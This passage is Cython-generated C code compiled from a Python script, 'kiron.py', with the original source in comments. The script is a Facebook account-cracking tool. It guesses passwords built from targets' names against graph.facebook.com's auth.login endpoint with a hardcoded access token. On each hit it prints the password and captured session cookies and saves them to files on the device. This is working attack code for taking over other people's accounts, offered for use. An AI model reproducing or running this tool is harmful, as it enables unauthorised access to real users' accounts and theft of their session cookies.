          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = __pyx_pf_5kiron_4api2_3genexpr(NULL, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 656, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__71, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 656, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_v_coki = ((PyObject*)__pyx_t_5);
          __pyx_t_5 = 0;

          /* "kiron.py":657
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 */
          __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 657, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_22 = 0;
          __pyx_t_8 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m);
          __pyx_t_8 = (1114111 > __pyx_t_8) ? 1114111 : __pyx_t_8;
          __pyx_t_22 += 40;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_38_5_244m);
          PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_38_5_244m_38_5_46m_38_5_244m);
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_A); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 657, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 657, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_8;
          __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_10);
          __pyx_t_10 = 0;
          __Pyx_INCREF(__pyx_kp_u__25);
          __pyx_t_22 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__25);
          PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__25);
          __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 657, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_10, __pyx_v_coki); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 657, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 657, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":658
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()             # <<<<<<<<<<<<<<
 *                                         open('/sdcard/AYYUB-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 *                                         oks.append(ids)
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 658, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = NULL;
          __pyx_t_13 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
              __pyx_t_13 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
            __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 658, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          }
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":659
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")             # <<<<<<<<<<<<<<
 *                                         oks.append(ids)
 *                                         break
 */
          __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__92, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 659, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 659, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__32); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 659, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_v_pas); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 659, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__32); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 659, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_v_coki); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 659, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__33); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 659, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          __pyx_t_18 = NULL;
          __pyx_t_13 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_18)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_18);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_13 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_t_5};
            __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
            __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 659, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":660
 *                                         linex()
 *                                         open('/sdcard/AYYUB-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 *                                         oks.append(ids)             # <<<<<<<<<<<<<<
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_oks); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 660, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_10, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 660, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

          /* "kiron.py":661
 *                                         open('/sdcard/AYYUB-FILE-M2-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
 *                                         oks.append(ids)
 *                                         break             # <<<<<<<<<<<<<<
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:
 */
          goto __pyx_L18_break;

          /* "kiron.py":654
 *                         url = 'https://graph.facebook.com/method/auth.login'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 */
        }

        /* "kiron.py":662
 *                                         oks.append(ids)
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 */
        __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_error); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 662, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_10, __pyx_n_s_message); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 662, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_4, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 662, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (__pyx_t_23) {

          /* "kiron.py":663
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_pcp); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 663, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_y, __pyx_t_4, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 663, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (__pyx_t_23) {

            /* "kiron.py":664
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 cps.append(ids)
 */
            __pyx_t_4 = PyTuple_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_22 = 0;
            __pyx_t_8 = 127;
            __Pyx_INCREF(__pyx_kp_u_38_5_244m_4);
            __pyx_t_22 += 14;
            __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_4);
            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_4);
            __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Y); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
            __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
            __Pyx_GIVEREF(__pyx_t_5);
            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
            __pyx_t_5 = 0;
            __Pyx_INCREF(__pyx_kp_u_AYYUB_CP_38_5_244m);
            __pyx_t_22 += 20;
            __Pyx_GIVEREF(__pyx_kp_u_AYYUB_CP_38_5_244m);
            PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_AYYUB_CP_38_5_244m);
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Y); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_8;
            __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__25);
            __pyx_t_22 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__25);
            PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_kp_u__25);
            __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_4, 5, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_10, __pyx_v_ids); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__88); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = PyNumber_Add(__pyx_t_10, __pyx_v_pas); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 664, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "kiron.py":665
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                                 cps.append(ids)
 *                                                 break
 */
            __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__89, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 665, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 665, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__32); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 665, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_18 = PyNumber_Add(__pyx_t_10, __pyx_v_pas); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 665, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = PyNumber_Add(__pyx_t_18, __pyx_kp_s__33); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 665, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            __pyx_t_18 = NULL;
            __pyx_t_13 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_18)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_18);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
                __pyx_t_13 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_t_10};
              __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
              __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 665, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "kiron.py":666
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 cps.append(ids)             # <<<<<<<<<<<<<<
 *                                                 break
 *                                         else:
 */
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_cps); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 666, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 666, __pyx_L3_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "kiron.py":667
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 cps.append(ids)
 *                                                 break             # <<<<<<<<<<<<<<
 *                                         else:
 *                                                 break
 */
            goto __pyx_L18_break;

            /* "kiron.py":663
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/AYYUB-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          }

          /* "kiron.py":669
 *                                                 break
 *                                         else:
 *                                                 break             # <<<<<<<<<<<<<<
 *                         else:
 *                                         continue
 */
          /*else*/ {
            goto __pyx_L18_break;
          }

          /* "kiron.py":662
 *                                         oks.append(ids)
 *                                         break
 *                         elif 'www.facebook.com' in po['error']['message']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print(f'\r\r\x1b[38;5;244m[{Y}AYYUB-CP\x1b[38;5;244m]{Y} '+ids+' | '+pas+'\033[1;97m')
 */
        }

        /* "kiron.py":671
 *                                                 break
 *                         else:
 *                                         continue             # <<<<<<<<<<<<<<
 *                 loop+=1
 *         except requests.exceptions.ConnectionError:
 */
        /*else*/ {
          goto __pyx_L17_continue;
        }

        /* "kiron.py":580
 *                 except:
 *                         ln = fn
 *                 for pw in passlist:             # <<<<<<<<<<<<<<
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __pyx_L17_continue:;
      }
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      goto __pyx_L21_for_end;
      __pyx_L18_break:;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      goto __pyx_L21_for_end;
      __pyx_L21_for_end:;

      /* "kiron.py":672
 *                         else:
 *                                         continue
 *                 loop+=1             # <<<<<<<<<<<<<<
 *         except requests.exceptions.ConnectionError:
 *                 time.sleep(10)
 */
      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_loop); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_11, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_loop, __pyx_t_4) < 0) __PYX_ERR(0, 672, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "kiron.py":572
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global oks,loop,sim_id
 *                 sys.stdout.write(f'\r\r\x1b[38;5;244m[\x1b[38;5;46m{date}\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;244m[\x1b[38;5;46m%s\x1b[38;5;244m|\x1b[1;91m%s\x1b[38;5;244m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
    __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "kiron.py":673
 *                                         continue
 *                 loop+=1
 *         except requests.exceptions.ConnectionError:             # <<<<<<<<<<<<<<
 *                 time.sleep(10)
 * #__________________| END |__________________#
 */
    __Pyx_ErrFetch(&__pyx_t_4, &__pyx_t_11, &__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_requests); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 673, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_10);
    __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 673, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_18);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 673, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
    __pyx_t_13 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_4, __pyx_t_10);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_ErrRestore(__pyx_t_4, __pyx_t_11, __pyx_t_5);
    __pyx_t_4 = 0; __pyx_t_11 = 0; __pyx_t_5 = 0;
    if (__pyx_t_13) {
      __Pyx_AddTraceback("kiron.api2", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_11, &__pyx_t_4) < 0) __PYX_ERR(0, 673, __pyx_L5_except_error)
      __Pyx_XGOTREF(__pyx_t_5);
      __Pyx_XGOTREF(__pyx_t_11);
      __Pyx_XGOTREF(__pyx_t_4);

      /* "kiron.py":674
 *                 loop+=1
 *         except requests.exceptions.ConnectionError:
 *                 time.sleep(10)             # <<<<<<<<<<<<<<
 * #__________________| END |__________________#
 * approval()
 */
      __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_time); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 674, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_18);
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_sleep); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 674, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
      __pyx_t_18 = NULL;
      __pyx_t_13 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_18)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_18);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
          __pyx_t_13 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_int_10};
        __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 674, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_10);
